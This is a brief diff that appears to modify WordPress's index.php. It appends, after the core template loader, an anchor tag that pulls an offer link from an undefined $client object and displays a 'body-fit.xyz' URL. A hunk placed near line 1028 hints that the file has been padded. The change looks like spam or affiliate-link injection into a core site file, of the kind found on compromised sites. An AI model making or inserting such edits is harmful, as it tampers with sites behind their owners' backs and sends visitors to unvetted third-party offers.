@@ -1,3 +1,4 @@
+
 <?php
 /**
  * Usage:
@@ -1028,3 +1029,5 @@ define( 'WP_USE_THEMES', true );
 
 /** Loads the WordPress Environment and Template */
 require __DIR__ . '/wp-blog-header.php';
+
+<a href="<?= $client->getOffer(1) ?>">'https://body-fit.xyz/jnvYdv'</a>
